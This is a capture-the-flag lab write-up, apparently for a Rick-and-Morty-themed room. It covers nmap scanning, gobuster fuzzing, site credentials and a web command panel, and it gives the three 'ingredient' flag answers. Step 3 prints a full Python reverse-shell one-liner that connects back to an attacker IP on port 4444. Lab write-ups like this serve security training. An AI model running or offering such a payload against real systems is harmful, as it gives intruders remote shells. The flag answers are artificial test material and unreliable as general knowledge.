# Problem

![image](https://github.com/user-attachments/assets/ee876d3e-1cbb-4e39-aa16-8c1400f4d977)

# Solution

## Step 1: Reconnaissance

**Command Used:**

```
nmap -sCV -A -T4 [IP address]
```

**Results:**

![image](https://github.com/user-attachments/assets/73d33630-f463-46e2-8a5d-76222fb037e6)

## Step 2: Enumeration

### Fuzzing

**Command Used:**

```
gobuster dir -u [Website] -w /usr/share/wordlists/dirb/common.txt -x php,html,js
```

**Note:** You can use other wordlists if you want

**Results:**

![image](https://github.com/user-attachments/assets/b5ed2129-038f-44a4-b1f8-22340665e59a)

### Scouting Website

Found this:

![image](https://github.com/user-attachments/assets/a875efd4-ead4-4726-b841-b54a9e7289b3)

And this:

![image](https://github.com/user-attachments/assets/bb36ac61-8c54-4dbe-a68b-f32150f38ab1)

Which was credentials for this:

![image](https://github.com/user-attachments/assets/5ebabfca-c9ff-4c65-b08f-7e292218ba04)

So now we have this:

![image](https://github.com/user-attachments/assets/9ca67d67-6fb6-4fb3-8c13-55834b13ddad)

## Step 3: Exploitation

**Commands Used:**

```
ls
less Sup3rS3cretPickl3Ingred.txt // no cat
```

**First Ingredient: mr. meeseek hair** 

**Note:** Some commands were disabled

Anyways I got tired of using the command line in the website so I just popped a rev shell :p

```
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.102.197",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

Forgot to mention there was a clue.txt file that told us to search the file system, it's in /home/rick btw

![image](https://github.com/user-attachments/assets/3630a8c2-af26-4fe2-b6bc-8981db20bac7)

**Second Ingredient: 1 jerry tear**

Last one I had a feeling it was in /root, so...

![image](https://github.com/user-attachments/assets/e94769ab-05f1-4bd0-9efe-f2f55e805d31)

**Final Ingredient: fleeb juice**
